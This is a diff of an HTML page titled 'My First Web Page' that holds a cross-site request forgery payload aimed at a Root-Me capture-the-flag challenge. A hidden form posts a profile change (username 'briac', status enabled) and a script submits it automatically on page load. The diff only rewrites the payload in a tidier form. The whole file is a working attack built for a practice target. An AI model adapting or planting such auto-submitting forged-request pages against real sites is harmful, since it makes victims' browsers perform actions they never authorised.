@@ -4,15 +4,13 @@
         <title>My First Web Page</title>
     </head>
     <body>
-        <form id="csrfForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
-          ------WebKitFormBoundaryFZO1RH6T1iu0xoNR
-          <input type="hidden" name="username" value="briac">
-          ------WebKitFormBoundaryFZO1RH6T1iu0xoNR
-          <input type="hidden" name="status" value="on">
-          ------WebKitFormBoundaryFZO1RH6T1iu0xoNR--
-        </form>
+        <form id="form" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data" hidden>
+	            <input type="text" name="username" value="briac">
+		        <input type="checkbox" name="status" checked="checked">
+		        <input type="submit" value="Submit request" />
+	    </form>
         <script>
-          document.getElementById('csrfForm').submit();
+            form.submit();
         </script>
-      </body>
+    </body>
 </html>
